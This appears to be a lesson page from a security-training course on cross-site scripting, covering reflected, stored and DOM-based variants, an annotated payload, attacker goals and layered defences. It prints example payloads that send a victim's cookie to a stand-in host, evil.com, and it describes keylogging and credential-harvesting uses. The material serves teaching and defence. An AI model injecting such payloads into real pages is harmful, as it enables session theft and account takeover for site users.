FOUNDATIONS PHASE // SPECIMEN: XSS
Cross-Site Scripting
Where SQL injection corrupts a database query, XSS injects executable script into a page that other people's browsers will trust and run. Same root cause, different organ.
VECTOR Untrusted HTML/JS output TARGET Other users' browsers OWASP A03 — Injection
01 / THE THREE STRAINS
Reflected, Stored, DOM-Based

All three strains share the same underlying mechanism — untrusted input ends up rendered as live HTML or JavaScript instead of inert text. What differs is where the payload lives and who it infects.

Reflected
Lives in the URL. Infects one victim per click.
Stored
Lives in the database. Infects every visitor.
DOM-Based
Lives in client JS. Never touches the server.

03 / PAYLOAD ANATOMY
Reading a Real Payload

Tap each colored fragment below to see what role it plays.

<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
HTML tag — needs to render as an element broken attribute — forces the browser to fire an error event actual payload — runs the instant the error fires
WHY src=x SPECIFICALLY

The image tag is pointed at a URL ("x") that will never resolve to a real image. The browser tries to load it, fails, and fires the onerror event — which the attacker has hijacked to run arbitrary JavaScript. No <script> tag required, which matters because some naive filters only block the literal string "script."

04 / WHAT A SUCCESSFUL PAYLOAD ACTUALLY DOES
Beyond the alert() Box

Tutorials use alert('XSS') because it's visible proof of execution. Real attacks almost never do this — a popping alert box warns the victim something is wrong. What real payloads do instead:

REAL-WORLD PAYLOAD GOALS
  • Session theft — fetch('//evil.com/?c='+document.cookie) silently exfiltrates the session cookie to an attacker-controlled server
  • Keylogging — attach a hidden keydown listener that streams every keystroke off-page
  • Page rewriting — inject a fake login form over the real page to harvest credentials directly
  • Worm propagation — on social platforms, have the payload repost itself to the victim's own profile, infecting their followers too
05 / THE FIX
Output Encoding, CSP, and HttpOnly

Three layers, each closing a different door. None of them alone is sufficient — together they make XSS exploitation extremely difficult even when an injection point exists.

VULNERABLE
div.innerHTML = userComment;
OUTPUT-ENCODED
div.textContent = userComment;
// or: HTML-encode < > & " ' before insert
NO POLICY
(no Content-Security-Policy header at all)
CSP HEADER SET
Content-Security-Policy:
script-src 'self'
READABLE COOKIE
Set-Cookie: session=abc123
HTTPONLY SET
Set-Cookie: session=abc123; HttpOnly
WHY ALL THREE

Output encoding stops the injection from ever becoming live HTML in the first place — the actual fix. CSP is a safety net: even if a payload sneaks through, a strict script-src policy can block it from executing or from phoning home to an attacker's domain. HttpOnly doesn't stop XSS at all — it limits the damage by making the session cookie unreadable to any script, injected or not, so even a successful XSS can't trivially hijack the session.
